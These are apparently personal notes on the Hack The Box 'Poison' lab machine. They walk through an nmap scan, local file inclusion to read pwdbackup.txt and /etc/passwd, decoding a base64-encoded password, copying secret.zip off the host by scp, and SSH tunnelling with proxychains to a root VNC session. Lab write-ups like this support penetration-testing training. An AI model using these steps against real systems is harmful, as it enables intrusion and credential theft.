###############
Poison
use of BurpSuite, Proxy and repeater
GETRequest manipulation
Apache FreeBSD 11.1
Reverse scp
Port Listenning
VNC Exploit
Dynamic SSH Tunnel
Proxychains
Documentation: https://0xdf.gitlab.io/2018/09/08/htb-poison.html
###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.1.254 -v
        PORT      STATE    SERVICE         VERSION
        22/tcp    open     ssh             OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
        | ssh-hostkey: 
        |   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
        |   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
        |_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
        80/tcp    open     http            Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
        |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-title: Site doesn't have a title (text/html; charset=UTF-8).




        Port 80:
            When we add "listfiles.php" in the formula then we submit:
                http://10.129.1.254/browse.php?file=listfiles.php
                    Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 

            # If we add "pwdbackup.txt" in url:
                http://10.129.1.254/browse.php?file=pwdbackup.txt

            It Display:
                This password is secure, it's encoded atleast 13 times.. what could go wrong really.. 

                Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
            
            Decrypt Base64 Password:
                # more than 13 times to get the Password
                echo YmFDVDNyMWFOMDBkbGVz | base64 -d 
                Charix!2#4%6&8(0
        
        BurpSuite:
            We are able to manipulate the Get request:
                # We use the proxy and the repeater
                GET /browse.php?file=/etc/passwd HTTP/1.1

            We are able to see the users:
                charix:*:1001:1001:charix:/home/charix:/bin/csh
                root:*:0:0:Charlie &:/root:/bin/csh

2-Priv Esc fromChqrix to root:
    charix@Poison:~ % ls
        secret.zip      user.txt

    # Reverse SCP:
        in Kali:
            └─$ scp -v -r -P 22 charix@10.129.1.254:secret.zip .

        in compromised machine:
            charix@Poison:~ % scp -P 22 secret.zip kali@10.10.15.53:~/Desktop/TJNull_OSCP/poison

    # Extract the zip file
        kali@kali# file secret
            secret: Non-ISO extended-ASCII text, with no line terminators

        kali@kali# cat secret | hexdump -C
            00000000  bd a8 5b 7c d5 96 7a 21   


    # ON the machine we check the ports:
        charix@Poison:~ % netstat -an -p tcp


    # We find a VNC Process with root privileges:
    # VNC is an interactive GUI program
        If we look at the process list, we can see the VNC process:
            charix@Poison:/usr/local/www/apache24/data % ps -auwwx | grep vnc
            root   608   0.0  0.9 23620  8872 v0- I    18:05   0:00.01 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
        
        # The process is running as root. That makes this an interesting privesc vector.
                :1 - display number 1
                -rfbauth /root/.vnc/passwd - specifies the file containing the password used to auth viewers
                -rfbport 5901 - tells us which port to connect to
                localhost - only listen locally

    # Dynamic SSH Tunnel for Pivoting:
        In Kali:
            └─$ ssh charix@10.129.1.254 -D 1080

            # We use the proxy from our machine
            └─$ proxychains vncviewer 127.0.0.1:5901 -passwd secret

    It opens q Prompt with the root privileges

